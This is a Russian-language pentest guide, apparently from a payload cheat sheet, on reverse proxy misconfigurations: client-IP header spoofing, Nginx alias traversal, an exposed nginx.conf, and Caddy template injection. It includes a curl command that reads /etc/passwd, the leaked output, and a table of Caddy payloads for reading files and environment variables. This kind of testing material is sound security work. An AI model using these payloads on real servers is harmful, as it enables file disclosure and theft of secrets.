**Неверные конфигурации обратного прокси (Reverse Proxy Misconfigurations)**

Обратный прокси — это сервер, который находится между клиентами и внутренними (бэкенд) серверами. Он перенаправляет запросы клиентов соответствующему серверу, скрывая внутреннюю инфраструктуру и часто обеспечивая балансировку нагрузки или кэширование. Неверные конфигурации обратного прокси, такие как неправильный контроль доступа, отсутствие очистки ввода в директивах `proxy_pass` или доверие к предоставленным клиентом заголовкам (например, `X-Forwarded-For`), могут привести к уязвимостям, включая несанкционированный доступ, выход за пределы каталога (directory traversal) или раскрытие внутренних ресурсов.

**Методология**

**HTTP-заголовки**

Поскольку такие заголовки, как `X-Forwarded-For`, `X-Real-IP` и `True-Client-IP`, являются обычными HTTP-заголовками, клиент может установить или переопределить их, если он может контролировать часть пути трафика — особенно при прямом подключении к серверу приложений или когда обратные прокси не фильтруют и не проверяют эти заголовки должным образом.

**X-Forwarded-For**

`X-Forwarded-For` — это HTTP-заголовок, используемый для идентификации исходного IP-адреса клиента, подключающегося к веб-серверу через HTTP-прокси или балансировщик нагрузки.

Когда клиент делает запрос через прокси или балансировщик нагрузки, этот прокси добавляет заголовок `X-Forwarded-For`, содержащий реальный IP-адрес клиента.

Если есть несколько прокси (запрос проходит через несколько из них), каждый прокси добавляет адрес, с которого он получил запрос, в заголовок, разделяя их запятыми.

```
X-Forwarded-For: 2.21.213.225, 104.16.148.244, 184.25.37.3
```

Nginx может переопределить этот заголовок, установив реальный IP-адрес клиента.

```
proxy_set_header X-Forwarded-For $remote_addr;
```

**X-Real-IP**

`X-Real-IP` — еще один пользовательский HTTP-заголовок, обычно используемый Nginx и некоторыми другими прокси для передачи исходного IP-адреса клиента. В отличие от `X-Forwarded-For`, который содержит цепочку IP-адресов, `X-Real-IP` содержит только один IP-адрес: адрес клиента, подключающегося к первому прокси.

**True-Client-IP**

`True-Client-IP` — это заголовок, разработанный и стандартизированный некоторыми провайдерами, особенно Akamai, для передачи исходного IP-адреса клиента через свою инфраструктуру.

**Nginx**

**Ошибка из-за слеша (Off By Slash)**

Nginx сопоставляет URI входящих запросов с блоками `location`, определенными в вашей конфигурации.

*   `location /app/` соответствует запросам к `/app/`, `/app/foo`, `/app/bar/123` и т.д.
*   `location /app` (без косой черты в конце) соответствует всему, что начинается с `/app`, например `/application`, `/appfile` и т.д.

Это означает, что в Nginx наличие или отсутствие слеша в блоке `location` меняет логику сопоставления.

```nginx
server {
  location /app/ {
    # Обрабатывает /app/ и всё, что ниже, например /app/foo
  }
  location /app {
    # Обрабатывает только /app без ничего после ИЛИ такие маршруты, как /application, /appzzz
  }
}
```

**Пример уязвимой конфигурации:** Злоумышленник, запрашивающий `/styles../secret.txt`, приводит к пути `/path/css/../secret.txt`.

```nginx
location /styles {
  alias /path/css/;
}
```

**Отсутствующая корневая локация (Missing Root Location)**

Директива `root /etc/nginx;` устанавливает корневую директорию сервера для статических файлов. Если в конфигурации нет корневой локации `/`, она будет установлена глобально. Запрос к `/nginx.conf` будет преобразован в `/etc/nginx/nginx.conf`.

```nginx
server {
  root /etc/nginx;

  location /hello.txt {
    try_files $uri $uri/ =404;
    proxy_pass http://127.0.0.1:8080/;
  }
}
```

**Caddy**

**Инъекция шаблонов (Template Injection)**

Предоставленная конфигурация веб-сервера Caddy использует директиву `templates`, которая позволяет отображать динамический контент с помощью шаблонов Go.

```
:80 {
    root * /
    templates
    respond "You came from {http.request.header.Referer}"
}
```

Это указывает Caddy обрабатывать строку ответа как шаблон и интерполировать любые переменные (с использованием синтаксиса шаблонов Go), присутствующие в указанном заголовке запроса.

В этом curl-запросе злоумышленник указал в качестве заголовка `Referer` выражение шаблона Go: `{{readFile "etc/passwd"}}`.

```bash
curl -H 'Referer: {{readFile "etc/passwd"}}' http://localhost/
```

Ответ сервера:

```
HTTP/1.1 200 OK
Content-Length: 716
Content-Type: text/plain; charset=utf-8
Server: Caddy
Date: Thu, 24 Jul 2025 08:00:50 GMT

You came from root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
```

Поскольку Caddy выполняет директиву `templates`, он вычисляет всё, что находится в фигурных скобках в соответствующем контексте, включая данные из недоверенного ввода. Функция `readFile` доступна в шаблонах Caddy, поэтому ввод злоумышленника заставляет Caddy фактически прочитать `/etc/passwd` и вставить его содержимое в HTTP-ответ.

**Полезные нагрузки для Caddy:**

| Полезная нагрузка | Описание |
| :--- | :--- |
| `{{env "VAR_NAME"}}` | Получить переменную окружения |
| `{{listFiles "/"}}` | Вывести список всех файлов в директории |
| `{{readFile "path/to/file"}}` | Прочитать файл |
